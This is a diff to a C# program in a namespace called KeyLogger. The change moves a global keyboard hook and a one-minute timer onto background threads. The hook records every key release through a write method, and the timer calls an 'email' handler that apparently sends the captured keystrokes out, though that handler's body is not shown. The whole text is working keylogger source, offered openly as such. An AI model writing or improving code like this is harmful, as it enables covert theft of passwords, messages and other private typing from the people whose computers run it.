@@ -10,43 +10,75 @@ using System.Timers;
 using MouseKeyboardActivityMonitor;
 using MouseKeyboardActivityMonitor.WinApi;
 using System.Windows.Forms;
+using System.Threading;
 
 namespace KeyLogger
 {
     class Program
     {
-        
+        private static Program logger;
         private System.Timers.Timer timer;
-        private KeyboardHookListener m_KeyboardHookManager;
+        private static KeyboardHookListener m_KeyboardHookManager;
        // private MouseHookListener m_MouseHookManager;
-
+       
         [STAThread]
         static void Main(string[] args)
         {
-            Program logger = new Program();
+            
+
+            logger = new Program();
+
+            
+
             logger.init();
             Console.Read();
         }
 
+        [STAThread]
         public void init()
         {
-            // try
-            //{
-           // m_MouseHookManager = new MouseHookListener(new GlobalHooker());
-            //m_MouseHookManager.Enabled = true;
-            
-            m_KeyboardHookManager = new KeyboardHookListener(new GlobalHooker())
-                {
-                    Enabled = true
-                };    
-                m_KeyboardHookManager.KeyUp += HookManager_KeyUp;
-           // }
-         //catch(Exception e) { Console.WriteLine("Error initializing thing"); };
-            this.timer = new System.Timers.Timer(1000*60*1);
+            //initHooks();
+            //initTimer();
+
+            Thread ht = new Thread(new ThreadStart(initHooks));
+            ht.IsBackground = true;
+            ht.SetApartmentState(System.Threading.ApartmentState.STA);
+            ht.Start();
+
+            Thread tt = new Thread(new ThreadStart(initTimer));
+            tt.IsBackground = true;
+            tt.SetApartmentState(System.Threading.ApartmentState.STA);
+            tt.Start();
+
+            //while (true)
+            //  System.IO.File.AppendAllText("log.txt", Console.ReadKey().KeyChar.ToString());
+        }
+
+        [STAThread]
+        private void initTimer()
+        {
+            this.timer = new System.Timers.Timer(1000 * 60 * 1);
             timer.Elapsed += new ElapsedEventHandler(email);
             timer.Start();
-            //while (true)
-              //  System.IO.File.AppendAllText("log.txt", Console.ReadKey().KeyChar.ToString());
+
+        }
+
+        [STAThread]
+        private static void initHooks()
+        {
+            try
+            {
+                // m_MouseHookManager = new MouseHookListener(new GlobalHooker());
+                //m_MouseHookManager.Enabled = true;
+
+                m_KeyboardHookManager = new KeyboardHookListener(new GlobalHooker())
+                {
+                    Enabled = true
+                };
+                m_KeyboardHookManager.KeyUp += logger.HookManager_KeyUp;
+                
+            }
+            catch (Exception e) { Console.WriteLine("Error initializing hook manager"); };
         }
 
         private void write(String str)
@@ -62,6 +94,7 @@ namespace KeyLogger
 
         private void HookManager_KeyUp(object sender, KeyEventArgs e)
         {
+            Console.WriteLine("Wrote a KeyUp");
             write(e.KeyData.ToString() + " Released");
         }
 
